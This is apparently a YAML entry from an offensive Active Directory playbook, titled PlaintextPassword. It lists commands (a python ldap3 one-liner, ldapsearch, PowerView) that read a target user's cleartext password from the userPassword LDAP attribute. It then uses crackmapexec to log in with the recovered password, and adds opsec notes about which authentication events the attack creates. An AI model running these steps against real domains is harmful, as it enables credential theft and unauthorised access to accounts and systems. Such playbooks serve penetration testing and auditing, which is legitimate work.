name: PlaintextPassword
description: Plaintext password found in userPassword LDAP attribute
commands:
- '# The userPassword attribute contains a cleartext password!'
- '# This is a legacy LDAP attribute that should never be used in AD'
- ''
- '# Read the password directly via LDAP'
- |
  python3 -c "
  import ldap3
  conn = ldap3.Connection('<DC_IP>', user='<DOMAIN>\\\\<USER>', password='<PASSWORD>', auto_bind=True)
  conn.search('<BASE_DN>', '(sAMAccountName=<TARGET_USER>)', attributes=['userPassword'])
  print(conn.entries[0].userPassword)
  "
- ''
- '# Using ldapsearch'
- ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b '<BASE_DN>' '(sAMAccountName=<TARGET_USER>)' userPassword
- ''
- '# Using PowerView'
- Get-DomainUser -Identity <TARGET_USER> -Properties userpassword | Select userpassword
- ''
- '# Authenticate with recovered password'
- crackmapexec smb <DC_IP> -u '<TARGET_USER>' -p '<RECOVERED_PASSWORD>' -d '<DOMAIN>'
opsec:
- Reading LDAP attributes is normal activity
- Using the password will create authentication events
references:
- https://docs.microsoft.com/en-us/windows/win32/adschema/a-userpassword
